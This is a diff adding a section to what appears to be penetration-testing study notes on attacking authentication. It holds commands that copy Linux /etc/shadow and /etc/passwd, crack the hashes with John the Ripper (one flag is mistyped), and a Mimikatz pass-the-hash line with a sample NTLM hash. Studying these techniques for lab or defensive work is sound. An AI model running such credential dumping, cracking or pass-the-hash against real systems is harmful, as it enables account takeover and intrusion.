@@ -339,3 +339,54 @@ sekurlsa::credman
 {% endcode %}
 
 <figure><img src="../.gitbook/assets/image (1677).png" alt=""><figcaption></figcaption></figure>
+
+## Attacking Linux Authentication&#x20;
+
+### Dumping auth Files&#x20;
+
+{% code overflow="wrap" %}
+```bash
+sudo cp /etc/shadow /tmp/shadow.bak
+sudo cp /etc/passwd /etc/passwd.bak
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1690).png" alt=""><figcaption></figcaption></figure>
+
+### Identify Hash Types&#x20;
+
+Note that we've two different hash types `yescrypt` and `SHA512`.&#x20;
+
+<figure><img src="../.gitbook/assets/image (1692).png" alt=""><figcaption></figcaption></figure>
+
+### Cracking auth Files&#x20;
+
+{% hint style="info" %}
+_Note that we must know the type of hash before cracking it. hashcat doesn't support yescrypt yet._&#x20;
+{% endhint %}
+
+{% code overflow="wrap" %}
+```bash
+john unshadowed.hashes --wordlist=./password.txt --format-crypt
+john unshadowed.hashes --show
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1691).png" alt=""><figcaption></figcaption></figure>
+
+## Pass-The-Hash (PtH)
+
+### Using Mimikatz&#x20;
+
+{% hint style="danger" %}
+_Note that mimikatz always run in a privileged mode._&#x20;
+{% endhint %}
+
+{% code overflow="wrap" %}
+```cmd
+mimikatz.exe privilege::debug "sekurlsa::pth /user:backup /rc4:f9e37e83b83c47a93c2f09f66408631b /domain:. /run:cmd.exe" exit
+```
+{% endcode %}
+
+<figure><img src="../.gitbook/assets/image (1695).png" alt=""><figcaption></figcaption></figure>
+
